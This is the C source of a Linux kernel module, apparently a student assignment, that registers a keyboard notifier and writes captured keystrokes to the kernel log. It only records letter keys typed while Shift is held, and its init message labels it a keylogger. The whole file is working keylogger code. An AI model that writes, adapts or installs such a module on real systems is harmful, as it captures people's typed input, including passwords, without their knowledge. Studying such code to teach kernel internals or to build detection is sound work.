#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include "kbduskeymap.h"

struct semaphore sem;
static int shiftKeyPressed = 0;

int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;
	if (code == KBD_KEYCODE){
		if (param->value==42 || param->value==54){
			down(&sem);
			if (param->down) shiftKeyPressed = 1;
			else shiftKeyPressed = 0;
			up(&sem);
			return NOTIFY_OK;
		}
		if (param->down){
			down(&sem);
			if (shiftKeyPressed == 0);
			//if Shift is not pressed then it is not logged
			// so no action will be taken
			else
			if((param->value > 15 && param->value<=25) || (param->value > 29 && param->value<=38) || (param->value>43 && param->value<=50))
			printk(KERN_INFO "%s\n",keymapShiftActivated[param->value]);
			up(&sem);
		}
	}
	return NOTIFY_OK;
}
static struct notifier_block keylogger_nb ={
	.notifier_call = keylogger_notify
};

int init_module(void){	
	register_keyboard_notifier(&keylogger_nb);
	//printing initializing message
	printk(KERN_INFO "I am Bazif , CED17i015 the keylogger" " notifier list\n");
	sema_init(&sem, 1);
	return 0;
}

void cleanup_module(void){
	unregister_keyboard_notifier(&keylogger_nb);
	printk(KERN_INFO "Unregistered the keylogger module\n");
}

MODULE_LICENSE("GPL");
